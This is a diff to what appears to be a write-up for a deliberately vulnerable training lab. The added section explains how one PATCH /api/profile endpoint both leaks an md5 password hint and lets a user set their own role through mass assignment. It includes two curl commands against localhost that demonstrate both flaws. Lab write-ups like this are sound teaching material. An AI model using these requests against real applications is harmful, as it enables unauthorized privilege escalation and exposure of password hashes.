@@ -22,6 +22,24 @@ endpoint is also over-permissive about other fields — `level`, `verified`,
 `private_note`, `recovery_code` are all writable — which is a mass-assignment
 problem in its own right.)
 
+> **Same endpoint, abused two ways — and it is `PATCH`-only.** `/api/profile` is
+> the single profile *update* route, so it answers **`PATCH`**, not `GET`
+> (a browser address-bar `GET /api/profile` returns `405 Method Not Allowed`).
+> Every request must carry your `session` cookie. **Breach 01 *reads* its
+> response** — even an empty-body PATCH `{}` returns your full record, leaking
+> `pw_hint = md5(password)` — while **Breach 04 *writes* to it** to set `role`.
+> One over-trusting update endpoint is therefore both an information-disclosure
+> sink (Breach 01) and a privilege-escalation sink (this breach).
+
+```bash
+# read path (Breach 01): leaks your own pw_hint = md5(password)
+curl -s -b /tmp/j -X PATCH http://localhost:4942/api/profile \
+  -H 'Content-Type: application/json' --data '{}'
+# write path (Breach 04): escalates your own role
+curl -s -b /tmp/j -X PATCH http://localhost:4942/api/profile \
+  -H 'Content-Type: application/json' --data '{"role":"cadet"}'
+```
+
 ## Impact
 Vertical privilege escalation from a normal student to cadet/staff tooling
 (student management, newsletter admin, file upload, XML import) with a single
